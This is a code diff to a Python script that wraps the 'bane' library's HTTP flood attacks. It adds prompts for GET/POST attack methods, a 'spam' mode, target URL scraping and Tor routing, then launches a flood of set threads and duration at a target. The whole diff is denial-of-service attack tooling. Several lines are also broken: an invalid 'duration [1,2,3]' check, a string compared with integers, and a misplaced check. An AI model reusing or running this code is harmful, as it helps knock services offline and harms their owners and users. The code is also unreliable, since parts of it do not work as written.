@@ -60,7 +60,55 @@ while True:
     except:
         print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
 
-http_flooder_instance = bane.HTTP_Spam(target,p=port,timeout=timeout,threads=threads, duration=duration, tor=tor, logs=True)
+while True:
+    try:
+        method = int(input(bane.Fore.GREEN + '\nAttack method: \n\t1- GET \n\t2- POST \n\t3- GET + POST\n' + bane.Fore.WHITE))
+        if duration [1,2,3] :
+            break
+        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
+    except:
+        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
+
+
+while True:
+    try:
+        spam_mode = input(bane.Fore.GREEN + '\nDo you want to enable "spam" mode? ( yes / no ) : ' + bane.Fore.WHITE).lower()
+        if spam_mode in ['n','y','yes','no']:
+            if spam_mode in ['n','no']:
+                spam_mode=False
+            elif spam_mode in ['y','yes']:
+                spam_mode=True
+            break
+        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
+    except:
+        print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
+
+if spam_mode==True:
+    http_flooder_instance = bane.HTTP_Spam(target,p=port,timeout=timeout,threads=threads, duration=duration, tor=tor, logs=True,method=method)
+else:
+    scraped_urls=1
+    while True:
+        try:
+            scrape_target = input(bane.Fore.GREEN + '\nDo you want to scrape the target? ( yes / no ) : ' + bane.Fore.WHITE).lower()
+            if scrape_target in ['n','y','yes','no']:
+                if scrape_target in ['n','no']:
+                    scrape_target=False
+                elif scrape_target in ['y','yes']:
+                    scrape_target=True
+                break
+            print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
+        except:
+            print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
+        if scrape_target==True:
+            while True:
+                try:
+                    scraped_urls = input(bane.Fore.GREEN + '\nHow many URLs to collect? ( between 1 - 20 ) : ' + bane.Fore.WHITE).lower()
+                    if scraped_urls > 0 and scraped_urls < 21 :
+                        break
+                    print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
+                except:
+                    print(bane.Fore.RED + 'Please enter a valid choice..' + bane.Fore.WHITE)
+    http_flooder_instance = bane.HTTP_Puncher(target,p=port,timeout=timeout,threads=threads, duration=duration, tor=tor, logs=True,method=method,scrape_target=scrape_target,scraped_urls=scraped_urls)
 
 print(bane.Fore.RESET)
 
